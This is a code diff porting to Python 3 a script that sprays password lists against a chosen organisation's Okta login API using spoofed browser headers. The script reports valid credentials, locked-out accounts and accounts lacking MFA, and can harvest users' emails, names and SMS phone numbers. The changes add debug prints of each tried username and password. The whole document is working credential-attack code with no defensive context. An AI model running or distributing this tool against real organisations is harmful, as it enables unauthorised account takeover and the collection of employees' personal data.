@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 import requests
 import multiprocessing
 import argparse
@@ -13,15 +15,18 @@ args = parser.parse_args()
 subdomain = args.subdomain.replace(".okta.com", "")
 
 def checkCreds(creds):
+    print("here")
     username, password = creds
     session = requests.Session()
     rawBody = "{\"username\":\"%s\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":true},\"password\":\"%s\"}" % (username, password)
     headers = {"Accept":"application/json","X-Requested-With":"XMLHttpRequest","X-Okta-User-Agent-Extended":"okta-signin-widget-2.12.0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0","Accept-Encoding":"gzip, deflate","Accept-Language":"en","Content-Type":"application/json"}
     response = session.post("https://%s.okta.com/api/v1/authn"%subdomain, data=rawBody, headers=headers)
+    print(response.json())
+    print("creds: "+username+" "+password)
     if response.status_code == 200 and 'status' in response.json():
         jsonData = response.json()
         if "LOCKED_OUT" == jsonData['status']:
-            print "Account locked out! %s:%s"%(username, password)
+            print ("Account locked out! %s:%s"%(username, password))
         elif "MFA_ENROLL" == jsonData['status']:
             if args.csv:
                 email = jsonData['_embedded']['user']['profile']['login']
@@ -32,9 +37,9 @@ def checkCreds(creds):
                     for item in jsonData['_embedded']['factors']:
                         if "factorType" in item.keys() and item['factorType']=='sms':
                             phone = item['profile']['phoneNumber']
-                print ", ".join([username, password,email, fName, lName, phone])
+                print (", ".join([username, password,email, fName, lName, phone]))
             else:
-                print "Valid Credentials without MFA! %s:%s"%(username, password)
+                print ("Valid Credentials without MFA! %s:%s"%(username, password))
         else:
             if args.csv:
                 email = jsonData['_embedded']['user']['profile']['login']
@@ -45,9 +50,9 @@ def checkCreds(creds):
                     for item in jsonData['_embedded']['factors']:
                         if "factorType" in item.keys() and item['factorType']=='sms':
                             phone = item['profile']['phoneNumber']
-                print ", ".join([username, password,email, fName, lName, phone])
+                print (", ".join([username, password,email, fName, lName, phone]))
             else:
-                print "Valid Credentials! %s:%s"%(username, password)
+                print ("Valid Credentials! %s:%s"%(username, password))
 
 uL=open(args.userList)
 users = map(str.strip, uL.readlines())
@@ -61,6 +66,7 @@ combo = []
 for password in passwords:
     for user in users:
         combo.append([user, password])
+
 
 del users
 del passwords
